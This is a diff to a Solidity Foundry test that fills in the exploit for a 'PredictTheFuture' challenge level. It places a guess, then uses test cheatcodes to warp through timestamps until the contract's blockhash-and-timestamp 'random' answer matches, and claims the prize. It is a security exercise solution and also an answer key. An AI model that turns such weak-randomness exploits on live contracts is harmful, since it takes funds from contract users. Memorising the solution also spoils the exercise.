@@ -13,10 +13,36 @@ contract PredictTheFutureTest is BaseTest {
         instance = new PredictTheFuture{value: 0.01 ether}();
 
         vm.roll(143242);
+        vm.warp(1000000);
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint8 myGuess = 0;
+
+        vm.deal(address(this), 0.02 ether);
+        uint256 currentBlockNumber = block.number;
+        instance.setGuess{value: 0.01 ether}(myGuess);
+        uint256 nextBlockNumber = currentBlockNumber + 1;
+
+        vm.roll(nextBlockNumber + 1);
+        require(block.number > nextBlockNumber, "Block number not advanced");
+        bytes32 prevBlockHash = blockhash(block.number - 1);
+        uint256 currentTimestamp = block.timestamp;
+
+        bool found = false;
+
+        for (uint256 i = 0; i < 1000; i++) {
+            uint256 testTimestamp = currentTimestamp + i;
+            vm.warp(testTimestamp);
+            uint256 answer = uint256(keccak256(abi.encodePacked(prevBlockHash, testTimestamp))) % 10;
+
+            if (answer == myGuess) {
+                found = true;
+                break;
+            }
+        }
+        require(found, "Could not find matching timestamp");
+        instance.solution();
 
         checkSuccess();
     }
